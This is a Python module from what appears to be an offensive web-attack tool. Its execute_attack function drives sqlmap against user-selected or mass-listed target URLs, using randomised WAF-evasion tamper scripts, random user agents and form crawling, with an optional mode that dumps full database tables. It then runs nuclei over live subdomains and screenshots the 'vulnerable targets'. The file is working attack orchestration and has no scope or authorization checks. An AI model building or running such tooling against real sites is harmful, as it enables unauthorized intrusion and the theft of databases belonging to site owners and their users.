import os
import random
import shutil
import subprocess
import sys
from core.utils import G, C, Y, R, W
from core.logging import export_results

_TAMPER_POOL = ["space2comment", "between", "randomcase", "charencode", "equaltolike"]

def _get_tamper(args):
    if getattr(args, "tamper", None):
        return args.tamper
    return ",".join(random.sample(_TAMPER_POOL, 2))

def execute_attack(urls, args):
    print(f"\n{C}[+] Select target number to exploit (1-{len(urls)}) or type '{Y}all{C}': {W}", end="")
    try:
        choice = input().strip()
    except EOFError:
        print(f"\n{R}[-] Input interrupted.{W}")
        return
    
    tamper = _get_tamper(args)
    sqlmap_args = [
        "--batch",
        "--random-agent",
        f"--level={args.level}",
        f"--risk={args.risk}",
        "--forms",
        "--threads=5",
        f"--tamper={tamper}",
        "--timeout=10",
        "--retries=2",
    ]
    if args.proxy:
        sqlmap_args.append(f"--proxy={args.proxy}")
    if args.delay > 0:
        sqlmap_args.append(f"--delay={args.delay}")

    if args.dump:
        action_flags = ["--dbs", "--tables", "--dump"]
        print(f" {R}[!] DUMP mode active - full table extraction enabled.{W}")
    elif args.tables:
        action_flags = ["--dbs", "--tables"]
    else:
        action_flags = ["--dbs"]

    print(f"\n{Y}[*] Handing targets off to SQLMap...{W}")
    print(f" {C}[>] Level: {G}{args.level}{W}  Risk: {G}{args.risk}{W}  Tamper: {G}{tamper}{W}  Threads: {G}5{W}\n")

    if choice.lower() == 'all':
        print(f"{G}[+] Launching mass parallel checks...{W}\n")
        cmd = ["sqlmap", "-m", ".targets.txt"] + sqlmap_args + action_flags
        try:
            subprocess.run(cmd, check=False)
        except Exception as e:
            print(f"{R}[-] SQLMap execution failed: {e}{W}")
        export_results()
    else:
        try:
            val = int(choice) - 1
            if 0 <= val < len(urls):
                selected = urls[val]
                print(f"{G}[+] Testing endpoint: {W}{selected}\n")
                cmd = ["sqlmap", "-u", selected] + sqlmap_args + action_flags
                try:
                    subprocess.run(cmd, check=False)
                except Exception as e:
                    print(f"{R}[-] SQLMap execution failed: {e}{W}")
                export_results()
            else:
                print(f"{R}[-] Error: Invalid target index selection.{W}")
        except ValueError:
            print(f"{R}[-] Error: Non-numeric selection provided.{W}")

    if shutil.which("nuclei") and os.path.exists(".live_subs.txt"):
        print(f"\n{C}[>] Running Nuclei (broad vulnerability scan on live hosts)...{W}")
        try:
            subprocess.run(
                ["nuclei", "-l", ".live_subs.txt", "-silent",
                 "-severity", "medium,high,critical", "-stats"],
                check=False
            )
        except Exception as e:
            print(f"{R}[-] Nuclei failed: {e}{W}")

    if shutil.which("gowitness"):
        csv_path = os.path.join("logs", "vulnerable_targets.csv")
        if os.path.exists(csv_path):
            ss_dir = os.path.join("logs", "screenshots")
            os.makedirs(ss_dir, exist_ok=True)
            print(f"\n{C}[>] Running Gowitness (screenshotting vulnerable targets)...{W}")
            try:
                subprocess.run(
                    ["gowitness", "file", "-f", csv_path, "--screenshot-path", ss_dir],
                    check=False
                )
                print(f"{G}[+] Screenshots saved to {ss_dir}{W}")
            except Exception as e:
                print(f"{R}[-] Gowitness failed: {e}{W}")
